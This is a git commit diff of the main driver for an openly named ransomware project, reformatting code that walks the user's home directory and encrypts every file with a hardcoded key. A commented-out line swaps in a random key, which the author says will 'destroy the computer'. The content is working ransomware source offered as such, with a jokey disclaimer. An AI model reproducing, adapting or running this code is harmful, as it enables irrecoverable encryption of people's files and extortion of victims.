8cd24b954937ce01ad30a4809983b9747ef5e95b
Arunanshu Biswas <48434243+arunanshub@users.noreply.github.com>
2019-07-02 16:50:18 +0530

    Minor changes to Files

--- ransomware/main.py
+++ ransomware/main.py
@@ -1,28 +1,31 @@
+import os
+import base64
 from Locker import locker
 from walker import walker
 
+
 def main():
-  
-  """
-  This function is self explainable. And yes, DO NOT use it if
-  you seriously don't know what's going on. Still, it won't be a
-  prooblem, because, you already know the *HARDCODED_KEY*
-  """
-  
-  HARDCODED_KEY = "no please, don't see this"
-  
-  ###########################################################################
-  ##  Uncomment this line of code below if you want to destroy the computer
-  ##  but please don't blame me, as I warned you before... :)
-  
-  ## HARDCODED_KEY = base64.b64encode(os.urandom(32)).decode()
-  ###########################################################################
-  
-  path = os.path.expanduser('~')
-    
-  targets = walker(path)
+    """
+    This function is self explainable. And yes, DO NOT use it if
+    you seriously don't know what's going on. Still, it won't be a
+    prooblem, because, you already know the *hardcoded_key*
+    """
+
+    hardcoded_key = "no please, don't see this"
+
+    ###########################################################################
+    # Uncomment this line of code below if you want to destroy the computer,
+    # but please don't blame me, as I warned you before... :)
+
+    # hardcoded_key = base64.b64encode(os.urandom(32))
+    ###########################################################################
+
+    path = os.path.expanduser('~')
+
+    targets = walker(path)
     for target in targets:
-        locker(target, HARDCODED_KEY)
-  
+        locker(target, hardcoded_key)
+
+
 if __name__ == '__main__':
-  main()
+    main()
